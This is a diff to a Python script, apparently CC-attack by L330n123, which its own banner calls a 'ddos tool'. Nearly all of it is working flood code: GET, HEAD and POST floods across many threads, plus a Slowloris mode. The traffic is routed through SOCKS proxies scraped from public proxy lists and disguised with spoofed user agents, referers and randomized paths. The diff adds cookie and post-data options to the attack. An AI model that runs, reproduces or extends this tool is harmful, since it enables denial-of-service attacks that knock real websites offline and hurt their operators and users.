@@ -1,8 +1,9 @@
 #!/usr/bin/python3
 #Coded by L330n123
 #########################################
-#         Let's make some fun           #
-#    Maybe change the old output back   #
+#     Multiprocessing is so good        #
+#      But it is too powerful so        #
+#     I decided not release it out      #
 #                           -- L330n123 #
 #########################################
 import requests
@@ -25,15 +26,16 @@ print ('''
 	 CC/////  CC/////   | ddos tool |/ 
 	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Version 3.6 (2020/11/4)
+Python3 version 3.4 
 							C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
 ├─────────────────────────────────────────────┤
 │                 New stuff:                  │
-|          + Changed Output Indicator         |
-│          + Added Url Parser                 │
-|          - Removed Unnecessary Code         |
+|          + Added new socks4/5 api           |
+|          + Removed useless function         |
+│          + Customize Cookies                │
+│          + Customize data of post mode      │
 ├─────────────────────────────────────────────┤
 │ Link: https://github.com/Leeon123/CC-attack │
 └─────────────────────────────────────────────┘''')
@@ -54,7 +56,6 @@ acceptall = [
 		"Accept-Language: en-US,en;q=0.5\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
 		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]
-
 referers = [
 	"https://www.google.com/search?q=",
 	"https://check-host.net/",
@@ -70,18 +71,7 @@ referers = [
 	"https://steamcommunity.com/market/search?q=",
 	"https://www.ted.com/search?q=",
 	"https://play.google.com/store/search?q=",
-	"https://www.qwant.com/search?q=",
-	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
-	"https://www.google.ad/search?q=",
-	"https://www.google.ae/search?q=",
-	"https://www.google.com.af/search?q=",
-	"https://www.google.com.ag/search?q=",
-	"https://www.google.com.ai/search?q=",
-	"https://www.google.al/search?q=",
-	"https://www.google.am/search?q=",
-	"https://www.google.co.ao/search?q=",
 ]
-ind_dict = {}
 data = ""
 cookies = ""
 strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
@@ -89,20 +79,20 @@ strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
 Intn = random.randint
 Choice = random.choice
 ###################################################
-def build_threads(mode,thread_num,event,socks_type,ind_rlock):
+def build_threads(mode,thread_num,event,socks_type):
 	if mode == "post":
 		for _ in range(thread_num):
-			th = threading.Thread(target = post,args=(event,socks_type,ind_rlock,))
+			th = threading.Thread(target = post,args=(event,socks_type,))
 			th.setDaemon(True)
 			th.start()
 	elif mode == "cc":
 		for _ in range(thread_num):
-			th = threading.Thread(target = cc,args=(event,socks_type,ind_rlock,))
+			th = threading.Thread(target = cc,args=(event,socks_type,))
 			th.setDaemon(True)
 			th.start()
 	elif mode == "head":
 		for _ in range(thread_num):
-			th = threading.Thread(target = head,args=(event,socks_type,ind_rlock,))
+			th = threading.Thread(target = head,args=(event,socks_type,))
 			th.setDaemon(True)
 			th.start()
 
@@ -148,149 +138,13 @@ def getuseragent():
 def randomurl():
 	 return str(Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings) + Choice(strings)+str(Intn(0,271400281257))+Choice(strings)+str(Intn(0,271004281257))+Choice(strings))
 
-def GenReqHeader(method):
-	header = ""
-	if method == "get" or method == "head":
-		connection = "Connection: Keep-Alive\r\n"
-		if cookies != "":
-			connection += "Cookies: "+str(cookies)+"\r\n"
-		accept = Choice(acceptall)
-		referer = "Referer: "+Choice(referers)+ target + path + "\r\n"
-		useragent = "User-Agent: " + getuseragent() + "\r\n"
-		header =  referer + useragent + accept + connection + "\r\n"
-	elif method == "post":
-		post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
-		content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
-		refer = "Referer: http://"+ target + path + "\r\n"
-		user_agent = "User-Agent: " + getuseragent() + "\r\n"
-		accept = Choice(acceptall)
-		if mode2 != "y":# You can enable customize data
-			data = str(random._urandom(16)) 
-		length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
-		if cookies != "":
-			length += "Cookies: "+str(cookies)+"\r\n"
-		header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
-	return header
-
-def ParseUrl(original_url):
-	global target
-	global path
-	global port
-	global protocol
-	original_url = original_url.strip()
-	url = ""
-	path = "/"#default value
-	port = 80 #default value
-	protocol = "http"
-	#http(s)://www.example.com:1337/xxx
-	if original_url[:7] == "http://":
-		url = original_url[7:]
-	elif original_url[:8] == "https://":
-		url = original_url[8:]
-		protocol = "https"
-	#http(s)://www.example.com:1337/xxx ==> www.example.com:1337/xxx
-	#print(url) #for debug
-	tmp = url.split("/")
-	website = tmp[0]#www.example.com:1337/xxx ==> www.example.com:1337
-	check = website.split(":")
-	if len(check) != 1:#detect the port
-		port = int(check[1])
-	else:
-		if protocol == "https":
-			port = 443
-	target = check[0]
-	if len(tmp) > 1:
-		path = url.replace(website,"",1)#get the path www.example.com/xxx ==> /xxx
-
-def InputOption(question,options,default):
-	ans = ""
-	while ans == "":
-		ans = str(input(question)).strip().lower()
-		if ans == "":
-			ans = default
-		elif ans not in options:
-			print("> Please enter the correct option")
-			ans = ""
-			continue
-	return ans
-
-def CheckerOption():
-	global proxies
-	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
-	if N == 'y' or N == "" :
-		downloadsocks(choice)
-	else:
-		pass
-	if choice == "4":
-		out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
-		if out_file == '':
-			out_file = str("socks4.txt")
-		else:
-			out_file = str(out_file)
-		check_list(out_file)
-		proxies = open(out_file).readlines()
-	elif choice == "5":
-		out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
-		if out_file == '':
-			out_file = str("socks5.txt")
-		else:
-			out_file = str(out_file)
-		check_list(out_file)
-		proxies = open(out_file).readlines()
-	print ("> Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
-	time.sleep(0.03)
-	ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
-	if ans == "":
-		ans = "y"
-	if ans == "y":
-		ms = str(input("> Delay of socks(seconds, default=1):"))
-		if ms == "":
-			ms = int(1)
-		else :
-			try:
-				ms = int(ms)
-			except :
-				ms = float(ms)
-		check_socks(ms)
-
-def SetupIndDict():
-	global ind_dict
-	for proxy in proxies:
-		ind_dict[proxy.strip()] = 0
-
-def OutputToScreen(ind_rlock):
-	global ind_dict
-	i = 0
-	sp_char = ["|","/","-","\\"]
-	while 1:
-		if i > 3:
-			i = 0
-		print("{:^50}".format("Proxies attacking status"))
-		print("{:^50}".format("IP:PORT          |         RPS"))
-		#1. xxx.xxx.xxx.xxx:xxxxx ==> Rps: xxxx
-		ind_rlock.acquire()
-		top10 = sorted(ind_dict, key=ind_dict.get, reverse=True)
-		for num in range(10):
-			top = "none"
-			rps = 0
-			if len(ind_dict) != 0:
-				top = top10[num]
-				rps = ind_dict[top]
-				ind_dict[top] = 0
-			print("{:^50}".format("{:2d}. {:^22s} | Rps: {:d}".format(num+1,top,rps)))
-		total = 0
-		for k,v in ind_dict.items():
-			total = total + v
-			ind_dict[k] = 0
-		ind_rlock.release()
-		print("{:^50}".format(" ["+sp_char[i]+"] CC attack | Total Rps:"+str(total)))
-		i+=1
-		time.sleep(1)
-		print("\n"*50)
-
-def cc(event,socks_type,ind_rlock):
-	global ind_dict
-	header = GenReqHeader("get")
+def cc(event,socks_type):
+	connection = "Connection: Keep-Alive\r\n"
+	if cookies != "":
+		connection += "Cookies: "+str(cookies)+"\r\n"
+	accept = Choice(acceptall)
+	referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
+	useragent = "User-Agent: " + getuseragent() + "\r\n"
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
 	while True:
@@ -302,27 +156,28 @@ def cc(event,socks_type,ind_rlock):
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.connect((str(target), int(port)))
-			if protocol == "https":
+			s.connect((str(ip), int(port)))
+			if port == 443:
 				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=target)
+				s = ctx.wrap_socket(s,server_hostname=ip)
 			try:
-				for _ in range(multiple+1):
-					get_host = "GET " + path + "?" + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
-					request = get_host + header
+				for _ in range(multiple):
+					get_host = "GET " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+					request = get_host + referer + useragent + accept + connection +"\r\n"
 					s.send(str.encode(request))
-				s.close()
 			except:
 				s.close()
-			ind_rlock.acquire()
-			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
-			ind_rlock.release()
+			print ("[*] CC Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 		except:
 			s.close()
 
-def head(event,socks_type,ind_rlock):#HEAD MODE
-	global ind_dict
-	header = GenReqHeader("head")
+def head(event,socks_type):#HEAD MODE
+	connection = "Connection: Keep-Alive\r\n"
+	if cookies != "":
+		connection += "Cookies: "+str(cookies)+"\r\n"
+	accept = Choice(acceptall)
+	referer = "Referer: "+Choice(referers)+ ip + url2 + "\r\n"
+	useragent = "User-Agent: " + getuseragent() + "\r\n"
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
 	while True:
@@ -334,27 +189,34 @@ def head(event,socks_type,ind_rlock):#HEAD MODE
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.connect((str(target), int(port)))
-			if protocol == "https":
+			s.connect((str(ip), int(port)))
+			if port == 443:
 				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=target)
+				s = ctx.wrap_socket(s,server_hostname=ip)
 			try:
-				for _ in range(multiple+1):
-					head_host = "HEAD " + path + "?" + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
-					request = head_host + header
+				for _ in range(multiple):
+					head_host = "HEAD " + url2 + "?" + randomurl() + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+					request = head_host + referer + useragent + accept + connection +"\r\n"
 					s.send(str.encode(request))
-				s.close()
 			except:
 				s.close()
-			ind_rlock.acquire()
-			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
-			ind_rlock.release()
+			print ("[*] CC Flooding from | "+str(proxy[0])+":"+str(proxy[1]))
 		except:#dirty fix
 			s.close()
 
-def post(event,socks_type,ind_rlock):
-	global ind_dict
-	request = GenReqHeader("post")
+def post(event,socks_type):
+	global data
+	post_host = "POST " + url2 + " HTTP/1.1\r\nHost: " + ip + "\r\n"
+	content = "Content-Type: application/x-www-form-urlencoded\r\n"
+	refer = "Referer: http://"+ ip + url2 + "\r\n"
+	user_agent = "User-Agent: " + getuseragent() + "\r\n"
+	accept = Choice(acceptall)
+	if mode2 != "y":
+		data = str(random._urandom(16)) # You can enable bring data in HTTP Header
+	length = "Content-Length: "+str(len(data))+" \r\nConnection: Keep-Alive\r\n"
+	if cookies != "":
+		length += "Cookies: "+str(cookies)+"\r\n"
+	request = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
 	proxy = Choice(proxies).strip().split(":")
 	event.wait()
 	while True:
@@ -366,19 +228,16 @@ def post(event,socks_type,ind_rlock):
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			if brute:
 				s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-			s.connect((str(target), int(port)))
+			s.connect((str(ip), int(port)))
 			if str(port) == '443': # //AUTO Enable SSL MODE :)
 				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=target)
+				s = ctx.wrap_socket(s,server_hostname=ip)
 			try:
-				for _ in range(multiple+1):
+				for _ in range(multiple):
 					s.sendall(str.encode(request))
-				s.close()
 			except:
 				s.close()
-			ind_rlock.acquire()
-			ind_dict[(proxy[0]+":"+proxy[1]).strip()] += multiple+1
-			ind_rlock.release()
+			print ("[*] Post Flooding from  | "+str(proxy[0])+":"+str(proxy[1]))
 		except:
 			s.close()
 
@@ -393,10 +252,10 @@ def slow(conn,socks_type):
 			if socks_type == 5:
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			s.settimeout(1)
-			s.connect((str(target), int(port)))
+			s.connect((str(ip), int(port)))
 			if str(port) == '443':
 				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=target)
+				s = ctx.wrap_socket(s,server_hostname=ip)
 			s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
 			s.send("User-Agent: {}\r\n".format(getuseragent()).encode("utf-8"))
 			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
@@ -431,10 +290,10 @@ def slow(conn,socks_type):
 				if socks_type == 5:
 					s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 				s.settimeout(1)
-				s.connect((str(target), int(port)))
+				s.connect((str(ip), int(port)))
 				if int(port) == 443:
 					ctx = ssl.SSLContext()
-					s = ctx.wrap_socket(s,server_hostname=target)
+					s = ctx.wrap_socket(s,server_hostname=ip)
 				s.send("GET /?{} HTTP/1.1\r\n".format(Intn(0, 2000)).encode("utf-8"))# Slowloris format header
 				s.send("User-Agent: {}\r\n".format(getuseragent).encode("utf-8"))
 				s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
@@ -450,21 +309,17 @@ def slow(conn,socks_type):
 				sys.stdout.flush()
 				pass
 nums = 0
-def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
+def checking(lines,socks_type,ms):#Proxy checker coded by Leeon123
 	global nums
 	global proxies
 	proxy = lines.strip().split(":")
 	if len(proxy) != 2:
-		rlock.acquire()
 		proxies.remove(lines)
-		rlock.release()
 		return
 	err = 0
 	while True:
 		if err == 3:
-			rlock.acquire()
 			proxies.remove(lines)
-			rlock.release()
 			break
 		try:
 			s = socks.socksocket()
@@ -473,10 +328,10 @@ def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
 			if socks_type == 5:
 				s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
 			s.settimeout(ms)
-			s.connect((str(target), int(port)))
-			if protocol == "https":
+			s.connect((str(ip), int(port)))
+			if port == 443:
 				ctx = ssl.SSLContext()
-				s = ctx.wrap_socket(s,server_hostname=target)
+				s = ctx.wrap_socket(s,server_hostname=ip)
 			s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
 			s.close()
 			break
@@ -487,13 +342,12 @@ def checking(lines,socks_type,ms,rlock,):#Proxy checker coded by Leeon123
 def check_socks(ms):#Coded by Leeon123
 	global nums
 	thread_list=[]
-	rlock = threading.RLock()
 	for lines in list(proxies):
 		if choice == "5":
-			th = threading.Thread(target=checking,args=(lines,5,ms,rlock,))
+			th = threading.Thread(target=checking,args=(lines,5,ms,))
 			th.start()
 		if choice == "4":
-			th = threading.Thread(target=checking,args=(lines,4,ms,rlock,))
+			th = threading.Thread(target=checking,args=(lines,4,ms,))
 			th.start()
 		thread_list.append(th)
 		time.sleep(0.01)
@@ -557,8 +411,11 @@ def downloadsocks(choice):
 		except:
 			f.close()
 		try:#credit to All3xJ
-			r = requests.get("https://www.socks-proxy.net/",timeout=5)
-			part = str(r.content)
+			import urllib.request
+			req = urllib.request.Request("https://www.socks-proxy.net/",timeout=5)
+			req.add_header("User-Agent", getuseragent)
+			sourcecode = urllib.request.urlopen(req)
+			part = str(sourcecode.read())
 			part = part.split("<tbody>")
 			part = part[1].split("</tbody>")
 			part = part[0].split("<tr><td>")
@@ -608,31 +465,105 @@ def downloadsocks(choice):
 		print("> Have already downloaded socks5 list as socks5.txt")
 
 def main():
+	global ip
+	global url2
+	global port
+	global proxies
 	global multiple
 	global choice
 	global data
 	global mode2
 	global cookies
 	global brute
+	ip = ""
+	port = ""
+	mode = ""
 	print("> Mode: [cc/post/head/slow/check]")
-	mode = InputOption("> Choose Your Mode (default=cc) :",["cc","post","head","slow","check"],"cc")
-	url = str(input("> Input the target url:")).strip()
-	ParseUrl(url)
+	while mode == "" :
+		mode = str(input("> Choose Your Mode (default=cc) :")).strip()
+		if mode == "":
+			mode = "cc"
+		elif(mode != "cc") and (mode != "post")and (mode != "head")and(mode != "slow" )and(mode !="check"):
+			print("> Plese enter correct mode")
+			mode = ""
+			continue
+	ip = str(input("> Host/Ip:"))
+	if ip == "":
+		print("> Plese enter correct host or ip")
+		sys.exit(1)
+	if mode == "slow" or mode == "check":
+		pass
+	else:
+		url = str(input("> Page you want to attack(default=/):"))
+		if url == "":
+			url2 = "/"
+		else:
+			url2 = url
+	port = str(input("> Port(Https is 443):"))
+	if port == '':
+		port = int(80)
+		print("> Default choose port 80\r\n> Port 80 was chosen")
+	else:
+		port = int(port)
+		if str(port) == '443':
+			print("> [!] Enable SSL Mode")
 	if mode == "post":
-		mode2 = InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n")
+		mode2 = str(input("> Customize post data? (y/n, default=n):")).strip()
 		if mode2 == "y":
 			data = open(input("> Input the file's path:").strip()).readlines()
 			data = ' '.join([str(txt) for txt in data])
-	choice2 = InputOption("> Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n")
+	choice2 = str(input("> Customize cookies? (y/n, default=n):")).strip()
 	if choice2 == "y":
 		cookies = str(input("Plese input the cookies:")).strip()
-	choice = InputOption("> Choose your socks mode(4/5, default=5):",["4","5"],"5")
-	if choice == "4":
-		socks_type = 4
-	else:
-		socks_type = 5
+	choice = ""
+	while choice == "":
+		choice = str(input("> Choose your socks mode(4/5, default=5):")).strip()
+		if choice == "":
+			choice = "5"
+		if choice != "4" and choice != "5":
+			print("> [!] Error Choice try again")
+			choice = ""
+		if choice == "4":
+			socks_type = 4
+		else:
+			socks_type = 5
 	if mode == "check":
-		CheckerOption()
+		N = str(input("> Do you need to get socks list?(y/n,default=y):"))
+		if N == 'y' or N == "" :
+			downloadsocks(choice)
+		else:
+			pass
+		if choice == "4":
+			out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
+			if out_file == '':
+				out_file = str("socks4.txt")
+			else:
+				out_file = str(out_file)
+			check_list(out_file)
+			proxies = open(out_file).readlines()
+		elif choice == "5":
+			out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
+			if out_file == '':
+				out_file = str("socks5.txt")
+			else:
+				out_file = str(out_file)
+			check_list(out_file)
+			proxies = open(out_file).readlines()
+		print ("> Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
+		time.sleep(0.03)
+		ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
+		if ans == "":
+			ans = "y"
+		if ans == "y":
+			ms = str(input("> Delay of socks(seconds, default=1):"))
+			if ms == "":
+				ms = int(1)
+			else :
+				try:
+					ms = int(ms)
+				except :
+					ms = float(ms)
+			check_socks(ms)
 		print("> End of process")
 		return
 	if mode == "slow":	
@@ -646,8 +577,42 @@ def main():
 			thread_num = int(thread_num)
 		except:
 			sys.exit("Error thread number")
-	CheckerOption()
-	ind_rlock = threading.RLock()
+	N = str(input("> Do you need to get socks list?(y/n,default=y):"))
+	if N == 'y' or N == "" :
+		downloadsocks(choice)
+	else:
+		pass
+	if choice == "4":
+		out_file = str(input("> Socks4 Proxy file path(socks4.txt):"))
+		if out_file == '':
+			out_file = str("socks4.txt")
+		else:
+			out_file = str(out_file)
+		check_list(out_file)
+		proxies = open(out_file).readlines()
+	elif choice == "5":
+		out_file = str(input("> Socks5 Proxy file path(socks5.txt):"))
+		if out_file == '':
+			out_file = str("socks5.txt")
+		else:
+			out_file = str(out_file)
+		check_list(out_file)
+		proxies = open(out_file).readlines()
+	print ("> Number Of Socks%s Proxies: %s" %(choice,len(proxies)))
+	time.sleep(0.03)
+	ans = str(input("> Do u need to check the socks list?(y/n, defualt=y):"))
+	if ans == "":
+		ans = "y"
+	if ans == "y":
+		ms = str(input("> Delay of socks(seconds, default=1):"))
+		if ms == "":
+			ms = int(1)
+		else :
+			try:
+				ms = int(ms)
+			except :
+				ms = float(ms)
+		check_socks(ms)
 	if mode == "slow":
 		input("Press Enter to continue.")
 		th = threading.Thread(target=slow,args=(thread_num,socks_type,))
@@ -668,12 +633,10 @@ def main():
 			brute = False
 		event = threading.Event()
 		print("> Building threads...")
-		SetupIndDict()
-		build_threads(mode,thread_num,event,socks_type,ind_rlock)
+		build_threads(mode,thread_num,event,socks_type)
 		event.clear()
 		input("Press Enter to continue.")
 		event.set()
-	threading.Thread(target=OutputToScreen,args=(ind_rlock,),daemon=True).start()
 	while True:
 		try:
 			time.sleep(0.1)
